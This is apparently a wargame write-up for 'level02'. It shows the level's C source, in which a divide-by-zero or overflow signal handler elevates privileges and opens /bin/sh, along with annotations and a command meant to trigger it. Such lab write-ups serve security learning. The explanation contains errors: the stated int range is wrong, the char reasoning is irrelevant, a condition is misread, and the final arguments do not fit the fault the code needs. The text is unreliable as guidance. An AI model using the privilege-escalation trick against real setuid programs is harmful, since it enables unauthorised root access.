Level02
12/25/15 ------------------
Checking out the files in the directory levels there are 4 files relating to level 2.
level02
level02_alt
level02.c
level02_alt.c

running level02 we are granted with the phrase 
"source code is available in level02.c"

so we use vim to view the source code of level02.c to analyze what is happening. 

  1 //a little fun brought to you by bla
  2
  3 #include <stdio.h>
  4 #include <stdlib.h>
  5 #include <signal.h>
  6 #include <unistd.h>
  7
  8 void catcher(int a)                                   <------ So this is where we want to be
  9 {
 10         setresuid(geteuid(),geteuid(),geteuid());
 11     printf("WIN!\n");
 12         system("/bin/sh");
 13         exit(0);
 14 }
 15
 16 int main(int argc, char **argv)                         <------- Begining of main statement. Looking input for an int and char as inputs.
 17 {
 18     puts("source code is available in level02.c\n");    <-------- Prints this when ran
 19
 20         if (argc != 3 || !atoi(argv[2]))        <------ argc has to  not be 3 or not be able to convert an array to an int from argv
 21                 return 1;                       <------ return if either is true
 22         signal(SIGFPE, catcher);                <--------  signal reports a fatal arithmetic error which results on the catcher to be used. So we need to break the integer value. 
 23         return abs(atoi(argv[1])) / atoi(argv[2]);
 24 }
 25

So essentially we need to figure out how to break the function.
A little search about the limitation of datatypes in C shows us the ranges of an Int and a Char

A int stores data from -21474836478 to 2147483647.
A char stores data from 0 to 255.

So in order to make the logic on line 20 of level02.c We need to run it with the following arguments.

./level02 -21473836479 256
